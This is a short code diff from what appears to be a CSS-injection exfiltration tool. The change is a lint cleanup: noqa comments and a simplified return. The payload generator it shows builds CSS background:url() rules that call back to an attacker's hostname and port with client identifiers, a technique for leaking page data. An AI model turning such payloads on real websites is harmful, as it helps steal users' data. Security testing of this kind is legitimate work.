@@ -26,10 +26,10 @@ class CompleteStrategy(BaseExfiltrationStrategy):
     def generate_start_payload(self, client: Client) -> str:
         return self._generate_payload(client)
 
-    def generate_next_payload(self, client: Client) -> str:
+    def generate_next_payload(self, client: Client) -> str:  # noqa: ARG002
         return 'next'
 
-    def handle_valid(self, client: Client, data: str) -> str:
+    def handle_valid(self, client: Client, data: str) -> str:  # noqa: ARG002
         return 'valid'
 
     def handle_end(self, client: Client) -> str:
@@ -44,8 +44,7 @@ class CompleteStrategy(BaseExfiltrationStrategy):
         return 'end'
 
     def _generate_payload(self, client: Client) -> str:
-        elements = ''.join(
+        return ''.join(
             f"html > {element}:nth-child(1){{background:url('//{self.hostname}:{self.port}/e?n={client.counter}&cid={client.id}');}}"
             for element in ELEMENTS
         )
-        return elements
